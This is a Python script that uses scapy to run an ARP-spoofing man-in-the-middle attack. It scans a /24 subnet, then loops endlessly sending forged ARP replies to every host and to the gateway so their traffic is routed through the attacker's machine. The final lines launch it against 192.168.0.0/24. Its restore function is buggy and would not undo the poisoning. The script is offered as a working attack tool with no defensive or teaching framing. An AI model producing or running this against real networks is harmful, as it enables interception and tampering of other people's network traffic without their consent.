#!usr/bin/env python

import scapy.all as scapy

class MITM:
	def __init__(self, target_ip, gateway_ip, attacker_ip):
		self.target_ip = target_ip
		self.gateway_ip = gateway_ip
		self.gateway_mac = self.extract_mac(gateway_ip)[1][0]
		self.attacker_ip = attacker_ip
		try:
			self.attacker_mac = self.extract_mac(attacker_ip)[1][0]
		except Exception as e:
			self.attacker_mac = input('please your MAC address manually  > ')
		self.device_details = self.extract_mac(target_ip)
		#print(self.device_details)
		#print(self.attacker_mac)
		#print(self.attacker_ip)

	def extract_mac(self, target):
		device_details = [[], []]
		arp_packet = scapy.ARP(pdst=target)
		ether_packet = scapy.Ether(dst="FF:FF:FF:FF:FF:FF")
		ready_packet =ether_packet/arp_packet
		responses = scapy.srp(ready_packet, verbose=False, timeout=2)[0]
		for response in responses:
				device_details[0].append(str(response[1].psrc)) 
				device_details[1].append(str(response[1].hwsrc))
		return device_details

	def send_ARP_packet(self, target_ip, gateway_ip, target_mac, source_mac):
		arp = scapy.ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac, hwsrc=source_mac)
		ether = scapy.Ether(dst=target_mac)
		packet = ether/arp
		scapy.sendp(packet, verbose=False)

	def ARP_spoofer(self):
		while True:
			index = 0
			for ip in self.device_details[0]:
				if(ip != self.gateway_ip and ip != self.attacker_ip):
					self.send_ARP_packet(ip, self.gateway_ip, self.device_details[1][index], self.attacker_mac)
					self.send_ARP_packet(self.gateway_ip, ip, self.gateway_mac, self.attacker_mac)
					print("[+]sent a packet to: " + str(ip) + ', mac address: ' + str(self.device_details[1][index]))
				index = index + 1

	def ARP_restore(self):
		index = 0 
		for ip in self.device_details[0]:
			for i in range(5):
				self.send_ARP_packet(ip, self.gateway_ip, self.device_details[1][index], self.gateway_ip)
				self.send_ARP_packet(self.gateway_ip, ip, self.gateway_mac, device_details[1][index], self.gateway_ip)

	def run(self):
		self.ARP_spoofer()



mitm = MITM("192.168.0.1/24", "192.168.0.1", "192.168.0.7")
mitm.run()
